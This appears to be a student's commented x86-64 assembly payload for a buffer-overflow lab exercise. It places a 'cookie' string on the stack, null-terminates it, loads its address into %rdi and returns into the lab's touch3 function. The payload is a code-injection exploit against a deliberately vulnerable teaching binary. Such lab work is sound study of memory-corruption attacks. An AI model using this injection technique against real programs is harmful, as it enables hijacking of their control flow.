pushq $0x4018fa  #put the addr of touch2 into the stacks
movq $0x6166373939623935,%rax  #store the string representation of cookies in %rax as the temporary store.
movq %rax,0x5561dc29  #pass the string to the addr which is far than the addr of function hexmatch's stacks.
movb $0,0x5561dc31  #add the null char in the end of this string.
movq $0x5561dc29,%rdi #set the addr of cookies string as the first argument of touch3
retq  #return to the touch3
